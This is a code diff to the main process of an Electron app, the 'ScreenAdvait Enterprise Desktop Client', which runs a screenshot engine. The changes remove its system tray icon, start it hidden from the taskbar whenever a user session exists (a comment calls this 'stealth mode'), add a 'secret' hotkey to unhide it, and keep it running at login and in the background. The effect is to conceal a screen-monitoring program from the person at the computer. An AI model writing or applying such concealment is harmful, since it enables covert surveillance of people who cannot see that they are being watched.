@@ -1,10 +1,9 @@
-import { app, BrowserWindow, Menu } from 'electron';
+import { app, BrowserWindow, Menu, globalShortcut } from 'electron';
 import path from 'path';
 import fs from 'fs';
 import { pathToFileURL } from 'url';
 import { initSqliteDb } from './sqlite.store.js';
 import { registerIpcHandlers } from './ipc.js';
-import { createSystemTray } from './tray.js';
 import { startScreenshotEngine } from './screenshot.engine.js';
 import { initializeSession } from './session.store.js';
 import { startRetentionCleanupWorker } from './retention.js';
@@ -36,6 +35,7 @@ if (!gotTheLock) {
   app.on('second-instance', () => {
     if (mainWindow && !mainWindow.isDestroyed()) {
       if (mainWindow.isMinimized()) mainWindow.restore();
+      mainWindow.setSkipTaskbar(false);
       mainWindow.show();
       mainWindow.focus();
     }
@@ -45,12 +45,16 @@ if (!gotTheLock) {
     try {
       if (mainWindow && !mainWindow.isDestroyed()) {
         if (mainWindow.isMinimized()) mainWindow.restore();
+        mainWindow.setSkipTaskbar(false);
         mainWindow.show();
         mainWindow.focus();
         return;
       }
 
+      const session = initializeSession();
+      // If user is already logged in, start hidden in stealth mode
       const isHiddenStart =
+        Boolean(session) ||
         process.argv.includes('--hidden') ||
         app.getLoginItemSettings().wasOpenedAtLogin;
 
@@ -62,6 +66,7 @@ if (!gotTheLock) {
         frame: true,
         autoHideMenuBar: true,
         show: !isHiddenStart,
+        skipTaskbar: isHiddenStart,
         title: 'ScreenAdvait Enterprise Desktop Client',
         backgroundColor: '#f8fafc',
         webPreferences: {
@@ -89,12 +94,14 @@ if (!gotTheLock) {
       }
 
       if (!isHiddenStart) {
+        window.setSkipTaskbar(false);
         window.show();
         window.focus();
       }
 
       window.webContents.on('did-fail-load', (_event, errorCode, errorDescription) => {
         logCrash('DID_FAIL_LOAD', `Code: ${errorCode}, Description: ${errorDescription}`);
+        window.setSkipTaskbar(false);
         window.show();
       });
 
@@ -111,6 +118,7 @@ if (!gotTheLock) {
       window.on('close', (event) => {
         if (!(app as any).isQuitting) {
           event.preventDefault();
+          window.setSkipTaskbar(true);
           window.hide();
         }
       });
@@ -121,10 +129,6 @@ if (!gotTheLock) {
 
   app.whenReady().then(() => {
     try {
-      const db = initSqliteDb();
-      const autoStart = db.prepare('SELECT value FROM local_settings WHERE key = ?').get('autoStart') as
-        | { value: string }
-        | undefined;
       if (app.isPackaged) {
         app.setLoginItemSettings({
           openAtLogin: true,
@@ -137,14 +141,28 @@ if (!gotTheLock) {
       logCrash('INIT_ERROR', err);
     }
 
-    createWindow();
-    if (mainWindow) {
-      try {
-        createSystemTray(mainWindow);
-      } catch (err) {
-        logCrash('SYSTEM_TRAY_ERROR', err);
-      }
+    try {
+      const ret = globalShortcut.register('CommandOrControl+Shift+Alt+S', () => {
+        console.log('[Main] Secret unhide shortcut triggered (Ctrl+Shift+Alt+S)!');
+        if (mainWindow && !mainWindow.isDestroyed()) {
+          if (mainWindow.isVisible()) {
+            mainWindow.setSkipTaskbar(true);
+            mainWindow.hide();
+          } else {
+            mainWindow.setSkipTaskbar(false);
+            mainWindow.show();
+            mainWindow.focus();
+          }
+        } else {
+          createWindow();
+        }
+      });
+      console.log('[Main] Registered secret hotkey Ctrl+Shift+Alt+S:', ret);
+    } catch (err) {
+      logCrash('HOTKEY_REGISTRATION_ERROR', err);
     }
+
+    createWindow();
 
     try {
       const session = initializeSession();
@@ -159,10 +177,15 @@ if (!gotTheLock) {
       if (BrowserWindow.getAllWindows().length === 0) {
         createWindow();
       } else if (mainWindow && !mainWindow.isDestroyed()) {
+        mainWindow.setSkipTaskbar(false);
         mainWindow.show();
         mainWindow.focus();
       }
     });
+  });
+
+  app.on('will-quit', () => {
+    globalShortcut.unregisterAll();
   });
 
   app.on('before-quit', () => {
@@ -170,8 +193,6 @@ if (!gotTheLock) {
   });
 
   app.on('window-all-closed', () => {
-    if (process.platform !== 'darwin') {
-      // Keep running in system tray
-    }
+    // Keep process running in background
   });
 }
